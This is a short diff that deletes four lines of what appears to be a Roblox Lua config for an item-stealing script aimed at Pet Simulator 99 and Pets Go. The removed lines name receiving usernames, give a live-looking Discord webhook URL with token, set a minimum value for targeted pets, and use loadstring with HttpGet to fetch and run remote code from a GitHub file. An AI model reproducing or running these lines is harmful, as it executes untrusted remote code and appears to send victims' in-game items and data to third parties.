@@ -1,4 +1,0 @@
-Username = {"StefanPlayz86","LOL2243X"} 
-Webhook = "https://discord.com/api/webhooks/1395918000976167034/NENTeHs1mAsddWuTLt6iEA38GeP5ORXDaxDaBNvSE0Rgs3c-FR5n7OlaplQTo8R7cRTT" 
-min_rap = 10000 --for pets go and pet simulator 99 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
